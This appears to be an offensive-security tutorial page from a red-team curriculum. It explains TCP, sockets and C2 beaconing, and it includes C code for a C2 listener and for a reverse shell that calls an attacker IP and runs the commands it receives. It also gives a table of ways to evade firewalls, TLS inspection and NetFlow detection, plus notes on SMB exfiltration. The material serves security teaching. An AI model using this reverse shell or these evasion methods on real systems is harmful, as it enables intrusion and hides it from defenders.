@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Wire: TCP, Sockets, and How C2 Actually Works | 22nd Survey Division</title>
+    <meta name="description" content="How a reverse shell works at the socket level. TCP handshake, ports, the socket API in C, C2 beacon pattern, common errors. ring-stack Phase 0 — the foundation every attack runs on.">
+    <meta property="og:title" content="The Wire: TCP, Sockets, C2 Communication | 22nd Survey Division">
+    <meta property="og:type" content="article">
+    <meta name="author" content="George Wu">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg:#0a0a0a;--card:#0d1117;--border:rgba(255,255,255,0.12);--text:#fff;--dim:#888;--link:#58a6ff;--green:#00ff88;--red:#ff4757;--orange:#ffa657;--purple:#a78bfa;--cyan:#00d4ff;--amber:#e3b341; }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.7;}
+        .navbar{background:rgba(10,14,20,0.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);padding:.75rem 1.5rem;position:sticky;top:0;z-index:100;}
+        .navbar-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;}
+        .logo{color:var(--text);text-decoration:none;font-weight:600;font-size:.9rem;}
+        .logo-sep{color:var(--dim);margin:0 .5rem;}
+        .logo-name{color:var(--dim);font-size:.75rem;}
+        .nav-links{display:flex;gap:1.5rem;}
+        .nav-links a{color:var(--dim);text-decoration:none;font-size:.8rem;}
+        .nav-links a:hover{color:var(--text);}
+        .hamburger{display:none;background:none;border:none;color:var(--text);font-size:1.5rem;cursor:pointer;}
+        .nav-mobile{display:none;flex-direction:column;gap:1rem;padding:1rem 0;}
+        .nav-mobile.open{display:flex;}
+        .nav-mobile a{color:var(--dim);text-decoration:none;font-size:.9rem;}
+        @media(max-width:768px){.nav-links{display:none;}.hamburger{display:block;}}
+        .container{max-width:900px;margin:0 auto;padding:3rem 1.5rem;}
+        .tag{display:inline-block;background:rgba(88,166,255,.1);color:var(--link);padding:.2rem .6rem;font-size:.65rem;font-weight:500;text-transform:uppercase;letter-spacing:.5px;margin-right:.5rem;margin-bottom:1rem;}
+        h1{font-size:2rem;font-weight:700;margin-bottom:.75rem;line-height:1.2;}
+        .meta{color:var(--dim);font-size:.8rem;margin-bottom:2rem;display:flex;gap:1.5rem;flex-wrap:wrap;}
+        h2{font-size:1.3rem;margin:2.5rem 0 1rem;}
+        h3{font-size:1.1rem;margin:2rem 0 .75rem;}
+        p{margin-bottom:1rem;color:var(--dim);font-size:.9rem;}
+        a{color:var(--link);text-decoration:none;}
+        a:hover{text-decoration:underline;}
+        code{font-family:'JetBrains Mono',monospace;background:rgba(255,255,255,.05);padding:.15rem .4rem;font-size:.8rem;border-radius:3px;}
+        pre{background:var(--card);border:1px solid var(--border);padding:1rem;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.6;margin:1rem 0;color:#c9d1d9;}
+        .code-c { color: #ffa657; }
+        .code-comment { color: #6a737d; }
+        ul,ol{margin:1rem 0 1rem 1.5rem;color:var(--dim);font-size:.9rem;}
+        li{margin-bottom:.5rem;}
+        .concept-box{background:rgba(88,166,255,.05);border-left:3px solid var(--link);padding:1rem 1.25rem;margin:1.5rem 0;}
+        .concept-box h4{color:var(--link);font-size:.85rem;margin-bottom:.5rem;font-weight:600;}
+        .concept-box p{margin-bottom:.5rem;}
+        .concept-box p:last-child{margin-bottom:0;}
+        .warning-box{background:rgba(255,71,87,.08);border-left:3px solid var(--red);padding:1rem 1.25rem;margin:1.5rem 0;}
+        .warning-box h4{color:var(--red);font-size:.85rem;margin-bottom:.5rem;font-weight:600;}
+        .warning-box p{margin-bottom:.5rem;}
+        .warning-box p:last-child{margin-bottom:0;}
+        .success-box{background:rgba(0,255,136,.06);border-left:3px solid var(--green);padding:1rem 1.25rem;margin:1.5rem 0;}
+        .success-box h4{color:var(--green);font-size:.85rem;margin-bottom:.5rem;font-weight:600;}
+        .success-box p{margin-bottom:0;}
+        .amber-box{background:rgba(227,179,65,.07);border-left:3px solid var(--amber);padding:1rem 1.25rem;margin:1.5rem 0;}
+        .amber-box h4{color:var(--amber);font-size:.85rem;margin-bottom:.5rem;font-weight:600;}
+        .amber-box p{margin-bottom:0;}
+        .diagram{background:var(--card);border:1px solid var(--border);padding:1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.7rem;line-height:1.5;overflow-x:auto;white-space:pre;color:var(--dim);}
+        .highlight{color:var(--green);}.highlight-amber{color:var(--amber);}.highlight-red{color:var(--red);}
+        .mitre-tag{display:inline-block;background:rgba(167,139,250,.15);color:var(--purple);padding:.15rem .5rem;font-size:.65rem;font-family:'JetBrains Mono',monospace;margin-right:.5rem;margin-bottom:.5rem;}
+        table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-size:.8rem;}
+        th,td{border:1px solid var(--border);padding:.75rem;text-align:left;}
+        th{background:rgba(255,255,255,.03);font-weight:600;}
+        td{color:var(--dim);}
+        .layman-box{background:rgba(0,212,255,.05);border-left:3px solid var(--cyan);padding:1rem 1.25rem;margin:1.5rem 0;}
+        .layman-label{font-size:.6rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:.4rem;}
+        .layman-tldr{font-size:.85rem;color:var(--text);font-weight:500;margin-bottom:.4rem;}
+        .layman-box p{font-size:.82rem;color:var(--dim);margin:0;}
+        .status-badge{display:inline-block;padding:.2rem .6rem;font-size:.65rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin-right:.5rem;}
+        .badge-validated{background:rgba(0,255,136,.15);color:var(--green);}
+        .api-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:.75rem;margin:1.5rem 0;}
+        .api-card{background:var(--card);border:1px solid var(--border);padding:.75rem 1rem;}
+        .api-fn{font-family:'JetBrains Mono',monospace;font-size:.85rem;font-weight:700;color:var(--amber);margin-bottom:.25rem;}
+        .api-role{font-size:.75rem;color:var(--dim);line-height:1.5;}
+        .error-grid{display:flex;flex-direction:column;gap:.75rem;margin:1.5rem 0;}
+        .error-card{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--red);padding:.75rem 1rem;}
+        .error-code{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--red);margin-bottom:.25rem;}
+        .error-meaning{font-size:.8rem;color:var(--dim);}
+        .error-fix{font-size:.75rem;color:var(--green);margin-top:.25rem;}
+        .footer{border-top:1px solid var(--border);padding:2rem 1.5rem;text-align:center;margin-top:4rem;}
+        .footer-links{display:flex;justify-content:center;gap:2rem;margin-bottom:1rem;}
+        .footer-links a{color:var(--dim);font-size:.8rem;}
+        .footer-copy{color:var(--dim);font-size:.7rem;}
+    </style>
+</head>
+<body>
+<nav class="navbar">
+    <div class="navbar-inner">
+        <div style="display:flex;align-items:center;">
+            <a href="/" class="logo">22nd Survey Division</a>
+            <span class="logo-sep">-</span>
+            <span class="logo-name">Open-Source Software Development</span>
+        </div>
+        <div class="nav-links">
+            <a href="/">Home</a>
+            <a href="/">Tools</a>
+            <a href="/writeups/">Writeups</a>
+            <a href="/writeups/">Research</a>
+            <a href="/learn/">Learn</a>
+        </div>
+        <button class="hamburger" onclick="this.nextElementSibling.classList.toggle('open')">&#9776;</button>
+    </div>
+    <div class="nav-mobile">
+        <a href="/">Home</a>
+        <a href="/writeups/">Writeups</a>
+        <a href="/learn/">Learn</a>
+    </div>
+</nav>
+
+<div class="container">
+
+    <span class="tag">Networking</span>
+    <span class="tag">C2 Architecture</span>
+    <span class="tag">Foundations</span>
+
+    <h1>The Wire: TCP, Sockets, and How C2 Actually Works</h1>
+
+    <div class="meta">
+        <span>George Wu</span>
+        <span>ring-stack Phase 0</span>
+        <span>22nd Survey Division</span>
+    </div>
+
+    <div class="layman-box" style="margin-top:1.5rem;">
+        <div class="layman-label">Plain English</div>
+        <div class="layman-tldr">Every attack in this curriculum travels over a network. A reverse shell is a socket. A C2 beacon is a scheduled network connection. A lateral movement tool is a protocol. Before you can debug a shell that won't connect, you need to know what a socket is, what a port is, and what the three-way handshake is. This chapter is that foundation.</div>
+    </div>
+
+    <p>
+        <span class="status-badge badge-validated">Validated</span> ring-stack Phase 0 — TCP listener, reverse shell, all errors below are from live kill chain development against a real Windows 11 target at 192.168.1.61.
+    </p>
+
+    <h2>Why This Matters Before Everything Else</h2>
+
+    <p>Every attack in this curriculum eventually reduces to the same five-node chain:</p>
+
+    <div class="diagram"><span class="highlight">YOUR MACHINE → SOCKET → PACKET → NETWORK → TARGET PROCESS</span>
+
+  If the connection fails, nothing else matters.
+  The shellcode runs but the shell drops?     → Socket problem.
+  The payload deploys but nothing comes back? → Firewall or port problem.
+  The SMB exfil fails with Error 67?          → Port 445 blocked at network boundary.
+  The listener times out?                     → Reverse shell not calling home.
+
+  <span class="highlight-amber">You can fire weapons without knowing this layer.
+  You cannot debug them without it.
+  When something breaks — and it will — this is where the answer lives.</span></div>
+
+    <h2>IP Addresses and Ports</h2>
+
+    <p>An IP address identifies a machine on the network. A port is a 16-bit number (0–65535) that identifies a <em>process</em> on that machine. IP gets the packet to the right machine. The port number routes it to the right process. Both together are an endpoint.</p>
+
+    <table>
+        <thead>
+            <tr><th>Port</th><th>Protocol</th><th>Attack relevance</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>22</td><td>SSH</td><td>Initial access, lateral movement, SCP payload delivery. Used throughout ring-stack to push payloads from Parrot Linux to victim VM.</td></tr>
+            <tr><td>80 / 443</td><td>HTTP / HTTPS</td><td>Blend-in ports. Traffic on 443 looks like normal web browsing — IDS is less likely to flag it. Use for C2 callbacks in live ops instead of 4444.</td></tr>
+            <tr><td>445</td><td>SMB</td><td>Windows file shares. Pass-the-Hash (Phase 6) runs here. Exfil to <code>\\attacker\share</code> uses 445. Frequently blocked at network boundary — caused Error 67 in ring-stack kill chain.</td></tr>
+            <tr><td>4444</td><td>C2 (Meterpreter default)</td><td>Defender and IDS flag this port by name. Fine in a lab VM. Switch to 443 in anything live.</td></tr>
+            <tr><td>5985</td><td>WinRM HTTP</td><td>evil-winrm connects here. Required open for Phase 6 lateral movement via WinRM.</td></tr>
+            <tr><td>3389</td><td>RDP</td><td>Remote Desktop. Lateral movement option. Needs credentials or pass-the-hash.</td></tr>
+            <tr><td>1024–65535</td><td>Ephemeral / high</td><td>Above 1024 = no admin needed to bind on Linux. Your listener binds here. Pick something that blends: 8080, 8443, 9001.</td></tr>
+        </tbody>
+    </table>
+
+    <h2>TCP: The Three-Way Handshake</h2>
+
+    <p>TCP (Transmission Control Protocol) is the transport under our shells, listeners, and exfil operations. Before any data flows, the connection must complete a three-way handshake. If the handshake fails — wrong IP, wrong port, firewall blocking — nothing runs.</p>
+
+    <div class="diagram">Attacker (192.168.1.151)                    Victim (192.168.1.61:4444)
+        │                                               │
+        │──────────── SYN ──────────────────────────▶  │  "I want to connect"
+        │                                               │
+        │  ◀─────────── SYN-ACK ─────────────────────  │  "Ready, acknowledge me"
+        │                                               │
+        │──────────── ACK ──────────────────────────▶  │  "Acknowledged"
+        │                                               │
+        │  ◀══════════ DATA FLOWS ═══════════════════▶  │  Shell active
+
+If the SYN is dropped:
+  → Firewall on the victim is blocking inbound port 4444
+  → Handshake never completes. Listener waits forever, nothing arrives.
+
+<span class="highlight">This is why reverse shells exist.</span>
+<span class="highlight">The victim initiates the SYN — calling out to the attacker.</span>
+<span class="highlight">Outbound traffic is almost never blocked on Windows.</span>
+<span class="highlight">The victim calls home. The attacker answers.</span></div>
+
+    <div class="concept-box">
+        <h4>Reverse shell vs bind shell</h4>
+        <p><strong>Reverse shell:</strong> victim connects to attacker. Outbound traffic is almost always allowed — Windows doesn't block outbound by default. The attacker runs a listener and waits for the victim to call home. This is the standard technique used throughout ring-stack.</p>
+        <p><strong>Bind shell:</strong> attacker connects to a port the victim opened. Requires an inbound firewall rule open on the victim — rarely available on a hardened target. Not used in ring-stack.</p>
+    </div>
+
+    <h2>Sockets in C — The Complete API</h2>
+
+    <p>A socket is a file descriptor. You write bytes to it and they go across the network. You read bytes from it and they came from the other end. The OS handles routing, retransmission, and checksums. You just open, read, write, close. Same pattern as file I/O.</p>
+
+    <div class="api-grid">
+        <div class="api-card">
+            <div class="api-fn">socket()</div>
+            <div class="api-role">Create a socket. Returns a file descriptor (int on Linux, SOCKET on Windows). AF_INET = IPv4. SOCK_STREAM = TCP.</div>
+        </div>
+        <div class="api-card">
+            <div class="api-fn">bind()</div>
+            <div class="api-role">Claim a port on a specific address. Use INADDR_ANY (0.0.0.0) to accept on all interfaces. Must run before listen().</div>
+        </div>
+        <div class="api-card">
+            <div class="api-fn">listen()</div>
+            <div class="api-role">Mark socket as passive — ready to accept incoming SYNs. Second param = backlog queue depth. 1 is fine for single-client C2.</div>
+        </div>
+        <div class="api-card">
+            <div class="api-fn">accept()</div>
+            <div class="api-role">Blocks until a client completes the handshake. Returns a NEW socket for that connection. Original listening socket stays open.</div>
+        </div>
+        <div class="api-card">
+            <div class="api-fn">connect()</div>
+            <div class="api-role">Triggers the TCP handshake to the target IP:port. Blocks until connected or timeout. This is the "call home" in the reverse shell.</div>
+        </div>
+        <div class="api-card">
+            <div class="api-fn">send() / recv()</div>
+            <div class="api-role">Write/read bytes over the connection. On Linux also works with write()/read() since sockets are file descriptors.</div>
+        </div>
+    </div>
+
+    <h3>Server side: the C2 listener (ring-stack Phase 1)</h3>
+
+    <pre><span class="code-comment">/* C2 Listener — Phase 1 core pattern */</span>
+int fd = socket(AF_INET, SOCK_STREAM, 0);          <span class="code-comment">// create socket</span>
+
+<span class="code-comment">// SO_REUSEADDR: lets you restart the listener without waiting for OS to free the port</span>
+int opt = 1;
+setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+struct sockaddr_in addr = {0};
+addr.sin_family      = AF_INET;
+addr.sin_port        = htons(4444);                <span class="code-comment">// host-to-network byte order</span>
+addr.sin_addr.s_addr = INADDR_ANY;                 <span class="code-comment">// accept on all interfaces</span>
+
+bind(fd, (struct sockaddr*)&addr, sizeof(addr));
+listen(fd, 1);                                     <span class="code-comment">// queue depth 1 = single connection</span>
+
+int client = accept(fd, NULL, NULL);               <span class="code-comment">// BLOCKS until victim connects</span>
+<span class="code-comment">// client = new socket for this specific connection
+// recv(client, ...) reads victim's output
+// send(client, ...) sends commands</span></pre>
+
+    <h3>Client side: the reverse shell (ring-stack Phase 2)</h3>
+
+    <pre><span class="code-comment">/* Reverse Shell — Phase 2 core pattern */</span>
+int fd = socket(AF_INET, SOCK_STREAM, 0);
+
+struct sockaddr_in attacker = {0};
+attacker.sin_family      = AF_INET;
+attacker.sin_port        = htons(4444);
+attacker.sin_addr.s_addr = inet_addr("192.168.1.151");  <span class="code-comment">// attacker IP</span>
+
+connect(fd, (struct sockaddr*)&attacker, sizeof(attacker));  <span class="code-comment">// call home</span>
+<span class="code-comment">// fd is now a bidirectional channel to the attacker
+// recv(fd, cmd, sizeof(cmd), 0)  → receives the command
+// popen(cmd, "r")                → runs the command, reads output
+// send(fd, output, len, 0)       → sends result back</span></pre>
+
+    <div class="amber-box">
+        <h4>Windows socket difference (Winsock)</h4>
+        <p>On Windows: include <code>winsock2.h</code> instead of <code>sys/socket.h</code>. Call <code>WSAStartup(MAKEWORD(2,2), &wsa)</code> before any socket function — skipping this causes silent failure. Socket type is <code>SOCKET</code>, not <code>int</code>. Invalid socket is <code>INVALID_SOCKET</code>, not <code>-1</code>. Everything else is the same API.</p>
+    </div>
+
+    <h2>The C2 Beacon Pattern</h2>
+
+    <p>A C2 implant (einayim_kav, shellchain, cheyanne) doesn't maintain a permanent open connection — that's loud on the wire. It beacons: connects, checks for commands, executes if any, disconnects, sleeps, repeats.</p>
+
+    <div class="diagram"><span class="highlight">C2 BEACON LOOP — what the implant does every cycle</span>
+──────────────────────────────────────────────────────────────
+  1. SLEEP     — wait N seconds (jitter: randomise ±30%)
+  2. RESOLVE   — DNS lookup of C2 domain (if domain-fronted)
+  3. CONNECT   — TCP connect to C2 server (port 443)
+  4. SEND      — HTTP POST: {beacon_id, hostname, username, priv}
+  5. RECEIVE   — HTTP response body: command or empty
+  6. EXECUTE   — if command: run it, collect output
+  7. SEND      — HTTP POST: {beacon_id, output}
+  8. CLOSE     — close TCP connection
+  9. goto 1
+
+<span class="highlight-amber">Why close and reconnect instead of keeping the socket open?</span>
+<span class="highlight-amber">A persistent TCP connection shows as an unusual long-lived flow in NetFlow.</span>
+<span class="highlight-amber">Short-lived HTTPS connections to a CDN look like normal browsing.</span></div>
+
+    <h2>Real Errors from the Kill Chain</h2>
+
+    <p>These fired during ring-stack development against a real Windows 11 target. Not hypothetical:</p>
+
+    <div class="error-grid">
+        <div class="error-card">
+            <div class="error-code">Connection refused</div>
+            <div class="error-meaning">Nothing is listening on the target port. Either the listener isn't running, or it's listening on a different port/interface than expected.</div>
+            <div class="error-fix">Fix: verify listener is running with netstat -an. Check port matches. SO_REUSEADDR prevents "address already in use" on restart.</div>
+        </div>
+        <div class="error-card">
+            <div class="error-code">Connection timed out (listener waits forever)</div>
+            <div class="error-meaning">SYN is being dropped by a firewall. The attacker sent SYN, victim firewall dropped it silently. No RST — just silence.</div>
+            <div class="error-fix">Fix: use a reverse shell (victim calls out on port 443/80). Outbound is almost never blocked. Inbound to 4444 usually is.</div>
+        </div>
+        <div class="error-card">
+            <div class="error-code">Error 67 — The network name cannot be found (SMB)</div>
+            <div class="error-meaning">UNC path like \\attacker\share is trying to reach port 445, which is blocked between subnets at the network boundary.</div>
+            <div class="error-fix">Fix: switch exfil to HTTP (port 80/443) or use SCP over SSH port 22 which is already open. Don't rely on SMB across subnets.</div>
+        </div>
+        <div class="error-card">
+            <div class="error-code">Shell connects but drops immediately</div>
+            <div class="error-meaning">Process exits before the shell can be used. Common when the shellcode thread spawns but the parent process exits, killing the thread.</div>
+            <div class="error-fix">Fix: WaitForSingleObject(thread, [uint32]::MaxValue). Do NOT use 0xFFFFFFFF directly in PowerShell — PS Int32 overflows. Use [uint32]::MaxValue instead.</div>
+        </div>
+        <div class="error-card">
+            <div class="error-code">send() returns -1 / WSAECONNRESET</div>
+            <div class="error-meaning">The remote end closed the connection. The attacker closed the listener, or it crashed, or a firewall reset the connection mid-session.</div>
+            <div class="error-fix">Fix: add reconnect loop — on WSAECONNRESET, sleep and try connect() again. Production implants retry on any connection failure.</div>
+        </div>
+    </div>
+
+    <h2>How Defenders See the Wire</h2>
+
+    <p>Network-layer defences work on different signals depending on what they can see:</p>
+
+    <table>
+        <thead>
+            <tr><th>Detection layer</th><th>What it sees</th><th>What beats it</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Port-based firewall rules</td>
+                <td>Destination port number</td>
+                <td>Use 443 (HTTPS). Blocked ports rarely include 443.</td>
+            </tr>
+            <tr>
+                <td>SNI inspection (TLS)</td>
+                <td>Domain name in TLS handshake</td>
+                <td>Domain fronting: CDN sees legitimate domain in SNI, C2 domain only in HTTP Host header inside TLS.</td>
+            </tr>
+            <tr>
+                <td>IP reputation / threat feeds</td>
+                <td>Destination IP</td>
+                <td>Route through CDN (Cloudflare). CDN IPs are trusted. C2 traffic is the CDN's incoming traffic.</td>
+            </tr>
+            <tr>
+                <td>NetFlow analysis</td>
+                <td>Connection duration, byte counts, interval regularity</td>
+                <td>Jitter: randomise sleep interval ±30%. Short connections: beacon then disconnect, not persistent session.</td>
+            </tr>
+            <tr>
+                <td>DPI (deep packet inspection)</td>
+                <td>Application-layer content</td>
+                <td>TLS encryption. Content inside TLS is opaque to DPI without certificate interception.</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>Further Reading</h2>
+
+    <ul>
+        <li><a href="/learn/#lastmile">Ch9: The Last Mile</a> — delivery architecture: HTML smuggling, LNK stagers, staged delivery, domain fronting</li>
+        <li><a href="/learn/#theframe">Ch10: The Frame</a> — C2 architecture: beacon design, persistence, anti-analysis</li>
+        <li><a href="/writeups/writeup-c2-architecture.html">Writeup: C2 Architecture</a> — full einayim_kav beacon design</li>
+        <li><a href="/writeups/writeup-einayim-implant.html">Writeup: Einayim Implant</a> — production C2 implant walkthrough</li>
+    </ul>
+
+</div>
+
+<footer class="footer">
+    <div class="footer-links">
+        <a href="/">Home</a>
+        <a href="/writeups/">Writeups</a>
+        <a href="/learn/">Learn</a>
+        <a href="/writeups/">Research</a>
+    </div>
+    <div class="footer-copy">22nd Survey Division &mdash; Vidimus Omnia</div>
+</footer>
+</body>
+</html>
